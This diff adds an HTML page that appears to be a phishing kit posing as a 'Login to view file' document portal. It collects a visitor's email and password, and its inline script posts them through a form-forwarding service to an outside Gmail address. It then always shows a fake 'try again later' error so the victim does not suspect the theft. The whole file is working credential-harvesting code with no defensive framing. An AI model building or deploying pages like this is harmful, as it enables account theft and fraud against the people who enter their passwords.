@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <link type="text/css" rel="stylesheet" href="styles/pdflink.css"> <!-- Link to external CSS file -->
+</head>
+<body style="background-image: url(./images/2g0K2Kj.png);"> <!-- Set background image -->
+    <header>
+        <a href="index.html"><img src="images/adh.png" alt="logo image"></a> <!-- Logo with link to homepage -->
+    </header>
+
+    <h1>Login to view file</h1> <!-- Page heading -->
+
+    <!-- Form to capture email and password -->
+    <form id="login-form">
+        <input type="hidden" name="_subject" value="New Login Submission">
+        <input type="hidden" name="_captcha" value="false">
+        
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required><br><br>
+        
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br><br>
+        
+        <input type="submit" value="Login">
+    </form>
+
+    <!-- Error message (Initially hidden, will be displayed after form submission) -->
+    <div id="error-message" style="color: red; font-weight: bold; display: none;">Sorry, please try again later.</div>
+
+    <script>
+        document.getElementById("login-form").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevents the default form submission (stops redirect)
+
+            let formData = new FormData(this); // Get form data
+
+            fetch("https://formsubmit.co/ajax/alicecorona236@gmail.com", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json()) // Parse response as JSON
+            .then(data => {
+                console.log("Success:", data);
+                document.getElementById("error-message").style.display = "block"; // Show error message
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                document.getElementById("error-message").innerText = "An error occurred. Please try again.";
+                document.getElementById("error-message").style.display = "block";
+            });
+        });
+    </script>
+
+    <script src="styles/pdflinks.js"></script> <!-- Link to external JavaScript file -->
+</body>
+</html>
